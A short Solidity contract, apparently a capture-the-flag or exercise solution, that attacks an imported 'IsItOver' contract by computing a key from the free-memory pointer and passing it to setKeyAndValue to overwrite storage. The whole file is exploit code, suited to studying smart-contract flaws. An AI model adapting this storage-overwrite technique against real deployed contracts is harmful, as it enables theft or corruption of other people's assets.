pragma solidity ^0.4.21;

import "./IsItOver.sol";


contract IsItOverAttack {
    IsItOver over;


    constructor(address _over) public{
        over = IsItOver(_over);
    }

    function attackOver() public
    {   
        uint256 base_ptr;
        assembly {
            base_ptr := mload(0x40)
        }
        base_ptr = base_ptr + (base_ptr * 32) + 32;
        over.setKeyAndValue(base_ptr,10000);
    }
    
}